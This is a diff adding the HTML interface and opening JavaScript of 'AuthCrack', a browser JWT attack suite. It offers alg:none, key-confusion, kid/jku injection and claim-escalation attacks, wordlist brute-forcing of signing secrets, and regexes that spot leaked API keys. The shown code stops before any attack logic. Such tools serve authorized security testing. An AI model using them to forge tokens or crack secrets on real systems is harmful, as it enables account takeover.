@@ -1,0 +1,1486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AuthCrack — Auth Header Analyzer & JWT Attack Suite</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --surface: #0f1318;
+    --surface2: #161b22;
+    --border: #21262d;
+    --accent: #00ff88;
+    --accent2: #ff6b35;
+    --accent3: #4da6ff;
+    --danger: #ff4444;
+    --warn: #ffcc00;
+    --text: #e6edf3;
+    --muted: #7d8590;
+    --mono: 'Share Tech Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,0.015) 2px, rgba(0,255,136,0.015) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Grid bg */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container { position: relative; z-index: 1; max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+  /* Header */
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 20px 0;
+    background: linear-gradient(180deg, rgba(0,255,136,0.05) 0%, transparent 100%);
+  }
+  .header-inner {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .logo-icon {
+    width: 40px; height: 40px;
+    background: var(--accent);
+    clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px;
+    animation: pulse-glow 3s ease-in-out infinite;
+  }
+  @keyframes pulse-glow {
+    0%, 100% { box-shadow: 0 0 20px rgba(0,255,136,0.4); }
+    50% { box-shadow: 0 0 40px rgba(0,255,136,0.8); }
+  }
+  .logo-text { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
+  .logo-text span { color: var(--accent); }
+  .logo-sub { font-family: var(--mono); font-size: 11px; color: var(--muted); letter-spacing: 2px; }
+  .status-bar {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 20px;
+  }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); display: inline-block; margin-right: 6px; animation: blink 1.5s infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+  /* Tabs */
+  .tabs {
+    display: flex;
+    gap: 2px;
+    padding: 20px 0 0;
+    border-bottom: 1px solid var(--border);
+    overflow-x: auto;
+  }
+  .tab {
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: 1px;
+    padding: 10px 20px;
+    border: 1px solid transparent;
+    border-bottom: none;
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.2s;
+    white-space: nowrap;
+    position: relative;
+    top: 1px;
+  }
+  .tab:hover { color: var(--text); background: var(--surface2); }
+  .tab.active {
+    color: var(--accent);
+    background: var(--surface);
+    border-color: var(--border);
+    border-bottom-color: var(--surface);
+  }
+  .tab .badge {
+    background: var(--accent);
+    color: #000;
+    font-size: 9px;
+    font-weight: 700;
+    padding: 1px 5px;
+    border-radius: 8px;
+    margin-left: 6px;
+  }
+
+  /* Panels */
+  .panel { display: none; padding: 24px 0; }
+  .panel.active { display: block; animation: fadeIn 0.3s ease; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+
+  /* Layout */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+  @media(max-width:800px) { .grid-2,.grid-3 { grid-template-columns: 1fr; } }
+
+  /* Cards */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 20px;
+  }
+  .card-title {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--muted);
+    margin-bottom: 16px;
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-title::before {
+    content: '';
+    width: 3px; height: 12px;
+    background: var(--accent);
+    border-radius: 2px;
+  }
+
+  /* Inputs */
+  textarea, input[type=text], input[type=file], select {
+    width: 100%;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 10px 12px;
+    outline: none;
+    transition: border-color 0.2s;
+    resize: vertical;
+  }
+  textarea:focus, input[type=text]:focus, select:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(0,255,136,0.1);
+  }
+  textarea { min-height: 100px; }
+  label {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    display: block;
+    margin-bottom: 6px;
+    letter-spacing: 1px;
+  }
+  .field { margin-bottom: 16px; }
+
+  /* Buttons */
+  .btn {
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: 1px;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .btn-primary {
+    background: var(--accent);
+    color: #000;
+    font-weight: 700;
+  }
+  .btn-primary:hover { background: #00cc6a; box-shadow: 0 0 20px rgba(0,255,136,0.4); }
+  .btn-danger {
+    background: var(--danger);
+    color: #fff;
+  }
+  .btn-danger:hover { background: #cc0000; }
+  .btn-ghost {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+  }
+  .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
+  .btn-warn { background: var(--warn); color: #000; font-weight: 700; }
+  .btn-warn:hover { background: #e6b800; }
+  .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 16px; }
+
+  /* Results */
+  .result-box {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 16px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.7;
+    margin-top: 16px;
+    min-height: 80px;
+    max-height: 500px;
+    overflow-y: auto;
+    word-break: break-all;
+  }
+
+  /* Tags */
+  .tag {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 3px;
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    margin: 2px;
+  }
+  .tag-green { background: rgba(0,255,136,0.15); color: var(--accent); border: 1px solid rgba(0,255,136,0.3); }
+  .tag-red { background: rgba(255,68,68,0.15); color: var(--danger); border: 1px solid rgba(255,68,68,0.3); }
+  .tag-yellow { background: rgba(255,204,0,0.15); color: var(--warn); border: 1px solid rgba(255,204,0,0.3); }
+  .tag-blue { background: rgba(77,166,255,0.15); color: var(--accent3); border: 1px solid rgba(77,166,255,0.3); }
+  .tag-orange { background: rgba(255,107,53,0.15); color: var(--accent2); border: 1px solid rgba(255,107,53,0.3); }
+
+  /* Finding rows */
+  .finding {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    padding: 10px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .finding:last-child { border-bottom: none; }
+  .finding-icon { font-size: 16px; margin-top: 1px; flex-shrink: 0; }
+  .finding-title { font-weight: 700; font-size: 13px; }
+  .finding-desc { color: var(--muted); font-size: 12px; margin-top: 3px; font-family: var(--mono); }
+  .finding-sev { font-size: 11px; font-weight: 700; margin-top: 4px; }
+  .sev-critical { color: var(--danger); }
+  .sev-high { color: var(--accent2); }
+  .sev-medium { color: var(--warn); }
+  .sev-info { color: var(--accent3); }
+  .sev-low { color: var(--accent); }
+
+  /* JWT segments */
+  .jwt-parts { display: flex; flex-direction: column; gap: 8px; margin: 12px 0; }
+  .jwt-part { padding: 10px 14px; border-radius: 4px; font-family: var(--mono); font-size: 12px; word-break: break-all; }
+  .jwt-header-part { background: rgba(255,107,53,0.1); border-left: 3px solid var(--accent2); }
+  .jwt-payload-part { background: rgba(77,166,255,0.1); border-left: 3px solid var(--accent3); }
+  .jwt-sig-part { background: rgba(0,255,136,0.1); border-left: 3px solid var(--accent); }
+  .jwt-label { font-size: 10px; letter-spacing: 2px; color: var(--muted); margin-bottom: 4px; }
+
+  /* Attack matrix */
+  .attack-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 14px;
+    border-radius: 4px;
+    margin-bottom: 6px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    transition: all 0.2s;
+  }
+  .attack-row:hover { border-color: var(--accent); }
+  .attack-row.success { border-color: var(--danger); background: rgba(255,68,68,0.08); }
+  .attack-status { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+  .status-pending { background: var(--muted); }
+  .status-running { background: var(--warn); animation: blink 0.8s infinite; }
+  .status-success { background: var(--danger); }
+  .status-fail { background: var(--accent); }
+  .attack-name { font-family: var(--mono); font-size: 12px; flex: 1; }
+  .attack-result { font-family: var(--mono); font-size: 11px; color: var(--muted); }
+
+  /* Progress bar */
+  .progress-wrap { background: var(--surface2); border-radius: 4px; height: 6px; margin: 12px 0; overflow: hidden; }
+  .progress-bar { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent3)); border-radius: 4px; transition: width 0.3s ease; }
+
+  /* Copy button */
+  .copy-btn {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 4px 10px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--muted);
+    border-radius: 3px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* Wordlist area */
+  .wordlist-info {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 6px;
+  }
+  .wordlist-info span { color: var(--accent); }
+
+  /* Divider */
+  .divider { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--surface2); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  /* Flex utils */
+  .flex { display: flex; }
+  .items-center { align-items: center; }
+  .justify-between { justify-content: space-between; }
+  .gap-2 { gap: 8px; }
+  .mt-1 { margin-top: 4px; }
+  .mt-2 { margin-top: 8px; }
+  .mb-1 { margin-bottom: 4px; }
+  .text-muted { color: var(--muted); font-size: 12px; }
+  .text-mono { font-family: var(--mono); }
+  .text-accent { color: var(--accent); }
+  .text-danger { color: var(--danger); }
+  .text-warn { color: var(--warn); }
+  .full { width: 100%; }
+
+  /* Checkbox */
+  .check-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 8px; }
+  .check-item {
+    display: flex; align-items: center; gap: 6px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 6px 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+  .check-item input { accent-color: var(--accent); }
+  .check-item:hover { border-color: var(--accent); }
+  .check-item.checked { border-color: var(--accent); background: rgba(0,255,136,0.08); color: var(--accent); }
+
+  /* Section header */
+  .section-hdr {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--muted);
+    text-transform: uppercase;
+    margin: 20px 0 10px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .section-hdr::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+  /* Tooltip */
+  [data-tip] { position: relative; }
+  [data-tip]:hover::after {
+    content: attr(data-tip);
+    position: absolute;
+    bottom: calc(100% + 6px);
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 4px 8px;
+    border-radius: 3px;
+    white-space: nowrap;
+    z-index: 100;
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-inner">
+      <div class="logo">
+        <div class="logo-icon">🔐</div>
+        <div>
+          <div class="logo-text">Auth<span>Crack</span></div>
+          <div class="logo-sub">AUTH HEADER ANALYZER + JWT ATTACK SUITE</div>
+        </div>
+      </div>
+      <div class="status-bar">
+        <span><span class="dot"></span>OFFLINE MODE — NO DATA LEAVES YOUR BROWSER</span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<div class="container">
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('analyzer')">🔍 AUTH ANALYZER</button>
+    <button class="tab" onclick="switchTab('jwt')">🧬 JWT DECODER</button>
+    <button class="tab" onclick="switchTab('attacks')">⚔️ JWT ATTACKS <span class="badge">7</span></button>
+    <button class="tab" onclick="switchTab('bruteforce')">🔑 SECRET BRUTEFORCE</button>
+    <button class="tab" onclick="switchTab('wordlist')">📋 WORDLIST MGR</button>
+  </div>
+
+  <!-- ===== AUTH ANALYZER ===== -->
+  <div id="tab-analyzer" class="panel active">
+    <div class="grid-2">
+      <div>
+        <div class="card">
+          <div class="card-title">INPUT — PASTE REQUEST HEADERS</div>
+          <div class="field">
+            <label>RAW HTTP HEADERS OR SINGLE AUTH VALUE</label>
+            <textarea id="rawHeaders" rows="10" placeholder="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+X-API-Key: sk_live_abc123
+Cookie: session=abc; token=xyz
+Basic dXNlcjpwYXNz
+
+-- or paste just a single value --
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.xxx"></textarea>
+          </div>
+          <div class="btn-row">
+            <button class="btn btn-primary" onclick="analyzeHeaders()">▶ ANALYZE</button>
+            <button class="btn btn-ghost" onclick="loadExample()">LOAD EXAMPLE</button>
+            <button class="btn btn-ghost" onclick="clearAll()">CLEAR</button>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <div class="card-title">QUICK CHECKS</div>
+          <div class="check-group" id="quickChecks">
+            <label class="check-item checked"><input type="checkbox" checked> Detect Auth Type</label>
+            <label class="check-item checked"><input type="checkbox" checked> Decode JWT</label>
+            <label class="check-item checked"><input type="checkbox" checked> Weak Algorithms</label>
+            <label class="check-item checked"><input type="checkbox" checked> Token Expiry</label>
+            <label class="check-item checked"><input type="checkbox" checked> Sensitive Claims</label>
+            <label class="check-item checked"><input type="checkbox" checked> API Key Patterns</label>
+            <label class="check-item checked"><input type="checkbox" checked> Basic Auth Decode</label>
+            <label class="check-item checked"><input type="checkbox" checked> Security Headers</label>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-title">DETECTION RESULTS</div>
+          <div id="detectionResults">
+            <div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">
+              Paste headers and click ANALYZE →
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <div class="card-title">SECURITY FINDINGS</div>
+          <div id="securityFindings">
+            <div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">
+              Findings will appear here...
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== JWT DECODER ===== -->
+  <div id="tab-jwt" class="panel">
+    <div class="grid-2">
+      <div>
+        <div class="card">
+          <div class="card-title">JWT TOKEN INPUT</div>
+          <div class="field">
+            <label>PASTE JWT TOKEN</label>
+            <textarea id="jwtInput" rows="6" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"></textarea>
+          </div>
+          <div class="btn-row">
+            <button class="btn btn-primary" onclick="decodeJWT()">▶ DECODE</button>
+            <button class="btn btn-ghost" onclick="loadJWTExample()">EXAMPLE</button>
+            <button class="btn btn-ghost" onclick="sendToAttacks()">→ SEND TO ATTACKS</button>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <div class="card-title">TOKEN STRUCTURE</div>
+          <div id="jwtParts">
+            <div class="text-muted text-mono" style="padding:10px 0;color:var(--muted);font-size:12px">Decode a token to see its structure...</div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-title">DECODED HEADER</div>
+          <div id="jwtHeader" class="result-box" style="min-height:100px">—</div>
+
+          <div class="card-title" style="margin-top:16px">DECODED PAYLOAD</div>
+          <div id="jwtPayload" class="result-box" style="min-height:120px">—</div>
+
+          <div class="card-title" style="margin-top:16px">JWT ANALYSIS</div>
+          <div id="jwtAnalysis">
+            <div class="text-muted text-mono" style="padding:10px 0;color:var(--muted);font-size:12px">Analysis will appear here...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== JWT ATTACKS ===== -->
+  <div id="tab-attacks" class="panel">
+    <div class="grid-2">
+      <div>
+        <div class="card">
+          <div class="card-title">TARGET JWT</div>
+          <div class="field">
+            <label>JWT TOKEN TO ATTACK</label>
+            <textarea id="attackJWT" rows="5" placeholder="Paste JWT here or use → Send to Attacks from decoder"></textarea>
+          </div>
+          <div class="field">
+            <label>ATTACK SELECTION</label>
+            <div class="check-group" id="attackSelection">
+              <label class="check-item checked"><input type="checkbox" checked id="atk-none"> alg:none bypass</label>
+              <label class="check-item checked"><input type="checkbox" checked id="atk-empty"> Empty secret</label>
+              <label class="check-item checked"><input type="checkbox" checked id="atk-rs256"> RS256→HS256 confusion</label>
+              <label class="check-item checked"><input type="checkbox" checked id="atk-kid"> kid injection</label>
+              <label class="check-item checked"><input type="checkbox" checked id="atk-jku"> jku header injection</label>
+              <label class="check-item checked"><input type="checkbox" checked id="atk-exp"> Expired token replay</label>
+              <label class="check-item checked"><input type="checkbox" checked id="atk-claim"> Claim escalation</label>
+            </div>
+          </div>
+          <div class="field">
+            <label>CUSTOM PAYLOAD OVERRIDE (JSON — optional)</label>
+            <textarea id="customPayload" rows="4" placeholder='{"sub":"admin","role":"superadmin","admin":true}'></textarea>
+          </div>
+          <div class="btn-row">
+            <button class="btn btn-danger" onclick="runAttacks()">⚔️ LAUNCH ATTACKS</button>
+            <button class="btn btn-ghost" onclick="clearAttacks()">CLEAR</button>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-title">ATTACK RESULTS</div>
+          <div id="attackProgress" style="display:none">
+            <div class="section-hdr">PROGRESS</div>
+            <div class="progress-wrap"><div class="progress-bar" id="atkProgressBar" style="width:0%"></div></div>
+            <div id="atkProgressLabel" class="text-muted text-mono" style="font-size:11px">Initializing...</div>
+          </div>
+
+          <div id="attackMatrix">
+            <div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">
+              Configure attacks and click LAUNCH →
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <div class="card-title">GENERATED TOKENS</div>
+          <div id="generatedTokens">
+            <div class="text-muted text-mono" style="padding:10px 0;color:var(--muted);font-size:12px">Attack tokens will appear here for testing...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== BRUTEFORCE ===== -->
+  <div id="tab-bruteforce" class="panel">
+    <div class="grid-2">
+      <div>
+        <div class="card">
+          <div class="card-title">JWT SECRET BRUTEFORCE</div>
+          <div class="field">
+            <label>JWT TOKEN (HS256/HS384/HS512)</label>
+            <textarea id="bruteJWT" rows="5" placeholder="Paste JWT token to crack..."></textarea>
+          </div>
+          <div class="field">
+            <label>WORDLIST SOURCE</label>
+            <div style="display:flex;gap:10px;flex-wrap:wrap">
+              <label class="check-item" id="wl-builtin-item" onclick="setWordlistMode('builtin')">
+                <input type="radio" name="wlmode" value="builtin" checked> Built-in list
+              </label>
+              <label class="check-item" id="wl-custom-item" onclick="setWordlistMode('custom')">
+                <input type="radio" name="wlmode" value="custom"> Custom file
+              </label>
+              <label class="check-item" id="wl-manager-item" onclick="setWordlistMode('manager')">
+                <input type="radio" name="wlmode" value="manager"> From manager
+              </label>
+            </div>
+          </div>
+          <div id="wl-builtin-opts">
+            <div class="field">
+              <label>BUILT-IN WORDLIST</label>
+              <select id="builtinWordlist">
+                <option value="common">Common secrets (500 entries)</option>
+                <option value="jwt_known">Known JWT secrets (200 entries)</option>
+                <option value="rockyou_top">RockYou top-1000</option>
+                <option value="api_keys">API key patterns</option>
+              </select>
+            </div>
+          </div>
+          <div id="wl-custom-opts" style="display:none">
+            <div class="field">
+              <label>UPLOAD WORDLIST FILE (.txt, one entry per line)</label>
+              <input type="file" id="customWordlistFile" accept=".txt,.lst,.wordlist" onchange="loadCustomWordlist(this)">
+              <div class="wordlist-info" id="customWordlistInfo">No file loaded</div>
+            </div>
+          </div>
+          <div id="wl-manager-opts" style="display:none">
+            <div class="field">
+              <label>SELECT FROM SAVED WORDLISTS</label>
+              <select id="savedWordlistSelect">
+                <option value="">— Go to Wordlist Manager to save lists —</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="field">
+            <label>OPTIONS</label>
+            <div class="check-group">
+              <label class="check-item checked"><input type="checkbox" checked id="opt-case"> Case variations</label>
+              <label class="check-item checked"><input type="checkbox" checked id="opt-num"> Append numbers</label>
+              <label class="check-item"><input type="checkbox" id="opt-leet"> Leet substitutions</label>
+              <label class="check-item"><input type="checkbox" id="opt-reverse"> Reverse strings</label>
+            </div>
+          </div>
+          <div class="btn-row">
+            <button class="btn btn-danger" onclick="startBrute()">🔑 START BRUTEFORCE</button>
+            <button class="btn btn-ghost" onclick="stopBrute()">■ STOP</button>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-title">BRUTEFORCE STATUS</div>
+          <div id="bruteStatus">
+            <div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">
+              Waiting for input...
+            </div>
+          </div>
+          <div id="bruteProgress" style="display:none">
+            <div class="progress-wrap"><div class="progress-bar" id="bruteProgressBar" style="width:0%"></div></div>
+            <div style="display:flex;justify-content:space-between;margin-top:6px">
+              <span class="text-mono" style="font-size:11px;color:var(--muted)" id="bruteLabel">0 / 0</span>
+              <span class="text-mono" style="font-size:11px;color:var(--muted)" id="bruteSpeed">0/s</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <div class="card-title">RESULTS LOG</div>
+          <div id="bruteLog" class="result-box" style="min-height:200px;color:var(--muted)">
+            Bruteforce log will appear here...
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== WORDLIST MANAGER ===== -->
+  <div id="tab-wordlist" class="panel">
+    <div class="grid-2">
+      <div>
+        <div class="card">
+          <div class="card-title">IMPORT WORDLIST</div>
+          <div class="field">
+            <label>UPLOAD .TXT FILE (one secret per line)</label>
+            <input type="file" id="wlUpload" accept=".txt,.lst,.wordlist" onchange="importWordlist(this)">
+            <div class="wordlist-info" id="wlUploadInfo">No file selected</div>
+          </div>
+          <div class="field">
+            <label>OR PASTE DIRECTLY</label>
+            <textarea id="wlPaste" rows="8" placeholder="secret123&#10;password&#10;jwt_secret&#10;myapp_key&#10;..."></textarea>
+          </div>
+          <div class="field">
+            <label>LIST NAME</label>
+            <input type="text" id="wlName" placeholder="my-custom-secrets">
+          </div>
+          <div class="btn-row">
+            <button class="btn btn-primary" onclick="saveWordlist()">💾 SAVE LIST</button>
+            <button class="btn btn-ghost" onclick="clearWlPaste()">CLEAR</button>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-title">SAVED WORDLISTS</div>
+          <div id="savedWordlists">
+            <div class="text-muted text-mono" style="padding:20px 0;text-align:center;color:var(--muted)">
+              No wordlists saved yet
+            </div>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <div class="card-title">WORDLIST STATS</div>
+          <div id="wlStats">
+            <div class="grid-3" style="gap:12px;padding:4px 0">
+              <div style="text-align:center">
+                <div style="font-size:24px;font-weight:800;color:var(--accent)" id="wlTotalLists">0</div>
+                <div class="text-muted text-mono" style="font-size:10px">LISTS SAVED</div>
+              </div>
+              <div style="text-align:center">
+                <div style="font-size:24px;font-weight:800;color:var(--accent3)" id="wlTotalEntries">0</div>
+                <div class="text-muted text-mono" style="font-size:10px">TOTAL ENTRIES</div>
+              </div>
+              <div style="text-align:center">
+                <div style="font-size:24px;font-weight:800;color:var(--accent2)" id="wlStorageSize">0KB</div>
+                <div class="text-muted text-mono" style="font-size:10px">STORAGE USED</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<script>
+// ==================== UTILITIES ====================
+
+function b64url(str) {
+  return btoa(str).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+}
+
+function b64urlDecode(str) {
+  str = str.replace(/-/g,'+').replace(/_/g,'/');
+  while(str.length % 4) str += '=';
+  try { return atob(str); } catch(e) { return null; }
+}
+
+function parseJWT(token) {
+  token = token.trim();
+  const parts = token.split('.');
+  if(parts.length !== 3) return null;
+  try {
+    const header = JSON.parse(b64urlDecode(parts[0]));
+    const payload = JSON.parse(b64urlDecode(parts[1]));
+    return { header, payload, parts, raw: token };
+  } catch(e) { return null; }
+}
+
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  event.target.classList.add('active');
+  document.getElementById('tab-'+name).classList.add('active');
+}
+
+function copyText(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('Copied!');
+  });
+}
+
+function showToast(msg) {
+  const t = document.createElement('div');
+  t.style.cssText = 'position:fixed;bottom:24px;right:24px;background:#0a0c0f;border:1px solid #00ff88;color:#00ff88;font-family:monospace;font-size:12px;padding:10px 16px;border-radius:4px;z-index:9999;animation:fadeIn 0.2s ease';
+  t.textContent = '✓ ' + msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 1800);
+}
+
+function syntaxHL(json) {
+  if(typeof json !== 'string') json = JSON.stringify(json, null, 2);
+  return json
+    .replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g, m => {
+      let cls = 'color:#00ff88';
+      if(/^"/.test(m)) { if(/:$/.test(m)) cls='color:#4da6ff'; else cls='color:#ffa657'; }
+      else if(/true|false/.test(m)) cls='color:#ff7b72';
+      else if(/null/.test(m)) cls='color:#ff7b72';
+      return `<span style="${cls}">${m}</span>`;
+    });
+}
+
+// ==================== AUTH ANALYZER ====================
+
+const API_KEY_PATTERNS = [
+  { name: 'Stripe Secret', rx: /sk_(live|test)_[0-9a-zA-Z]{24,}/, sev: 'CRITICAL' },
+  { name: 'Stripe Publishable', rx: /pk_(live|test)_[0-9a-zA-Z]{24,}/, sev: 'LOW' },
+  { name: 'GitHub Token', rx: /ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}/, sev: 'HIGH' },
+  { name: 'AWS Access Key', rx: /AKIA[0-9A-Z]{16}/, sev: 'CRITICAL' },
+  { name: 'Google API Key', rx: /AIza[0-9A-Za-z\-_]{35}/, sev: 'HIGH' },
+  { name: 'Slack Token', rx: /xox[baprs]-[0-9A-Za-z\-]{10,}/, sev: 'HIGH' },
+  { name: 'Twilio Token', rx: /SK[0-9a-fA-F]{32}/, sev: 'HIGH' },
+  { name: 'SendGrid Key', rx: /SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}/, sev: 'HIGH' },
+  { name: 'Firebase URL', rx: /https:\/\/[a-z0-9-]+\.firebaseio\.com/, sev: 'MEDIUM' },
+  { name: 'Generic Bearer', rx: /^[A-Za-z0-9\-_]{20,}$/, sev: 'INFO' }
+];
+
+const SECURITY_HEADERS = [
+  'strict-transport-security','x-content-type-options','x-frame-options',
+  'content-security-policy','x-xss-protection','permissions-policy',
+  'x-permitted-cross-domain-policies','referrer-policy'
+];
+
+function analyzeHeaders() {
+  const raw = document.getElementById('rawHeaders').value.trim();
+  if(!raw) { alert('Paste some headers first.'); return; }
+
+  const findings = [];
+  const detections = [];
+  const lines = raw.split('\n');
+  const headers = {};
+
+  // Parse headers
+  for(const line of lines) {
+    const idx = line.indexOf(':');
+    if(idx > 0) {
+      const k = line.slice(0, idx).trim().toLowerCase();
+      const v = line.slice(idx+1).trim();
+      headers[k] = v;
+    }
+  }
+
+  // 1. Detect auth type
+  const authHeader = headers['authorization'] || headers['x-authorization'] || '';
+  let authType = 'Unknown';
+
+  if(authHeader.toLowerCase().startsWith('bearer ')) {
+    const token = authHeader.slice(7).trim();
+    if(token.split('.').length === 3) {
+      authType = 'JWT Bearer Token';
+      detections.push({ icon:'🔵', label:'Auth Type', value:'JWT Bearer Token', cls:'tag-blue' });
+      // Auto-populate JWT fields
+      document.getElementById('jwtInput').value = token;
